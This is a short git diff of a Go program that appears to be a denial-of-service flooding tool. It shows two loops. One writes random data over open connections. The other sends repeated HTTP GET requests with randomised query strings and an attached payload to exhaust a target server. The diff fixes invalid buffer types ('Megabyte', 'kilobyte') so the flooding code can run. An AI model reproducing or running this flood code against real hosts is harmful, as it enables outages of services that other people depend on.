@@ -219,7 +219,7 @@ func main() {
 				}
 				defer conn.Close()
 				for {
-					buffer := make([]Megabyte, 512)
+					buffer := make([]byte, 1024)
 					rand.Read(buffer)
 					if stop > 0 {
 						break
@@ -266,8 +266,8 @@ func main() {
 					for t := 0; t < 140; t++ {
 						s.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
 						url := "GET /?" + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) //random url                                                                                                                                                                                                                                                                    // big buffer
-						tmp := make([]kilobyte, 512)                                                                                                                                                                                                                                                                          // using small tmo buffer for demonstrating
-						s.Write([]kilobyte(url + payload))
+						tmp := make([]byte, 1024)                                                                                                                                                                                                                                                                          // using small tmo buffer for demonstrating
+						s.Write([]byte(url + payload))
 						count++
 						_, err := s.Read(tmp)
 						if err != nil {
